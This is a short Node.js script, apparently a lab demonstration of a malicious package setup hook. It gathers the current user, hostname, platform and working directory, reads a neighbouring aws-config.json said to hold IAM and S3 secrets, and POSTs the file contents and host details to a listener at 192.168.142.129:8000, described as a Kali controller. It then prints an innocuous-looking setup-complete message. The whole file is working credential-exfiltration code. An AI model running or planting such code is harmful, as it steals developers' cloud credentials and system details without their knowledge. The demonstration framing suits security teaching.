const http = require("http");
const os = require("os");
const fs = require("fs");
const path = require("path");


const systemPayload = JSON.stringify({
  user: os.userInfo().username,
  host: os.hostname(),
  platform: process.platform,
  cwd: process.cwd()
});


const targetRepoFile = path.join(process.cwd(), "..", "aws-config.json");


if (fs.existsSync(targetRepoFile)) {
    const fileContent = fs.readFileSync(targetRepoFile, "utf8");
    console.log(`👉 Step 1: Found repository file (${targetRepoFile}) containing S3 configs! Reading secrets...`);
    

    const encodedData = encodeURIComponent(fileContent);
    
    console.log("📡 Step 2: Transmitting IAM secrets payload to Kali controller...");
    

    const req = http.request({
        host: "192.168.142.129",
        port: 8000,
        path: `/collect?file=${encodedData}`,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(systemPayload)
        }
    }, (res) => {
        console.log(`✅ Step 4: Success! Controller acknowledged data stream with status: ${res.statusCode}`);
    });

    req.on('error', (err) => {
        console.error("❌ Network Connection Error. Is your Netcat listener active? Error:", err.message);
    });


    req.write(systemPayload);
    req.end();
    
    console.log("📤 Step 3: Secrets packet sent into network stream...");
    

    setTimeout(() => {
        console.log("\n[setup] Initialization logic complete.");
        process.exit(0);
    }, 1500);

} else {
    console.log(`❌ Critical Demo Error: Could not locate ${targetRepoFile}`);
    console.log("👉 Make sure you ran Step 1 to create the aws-config.json file first!");
}
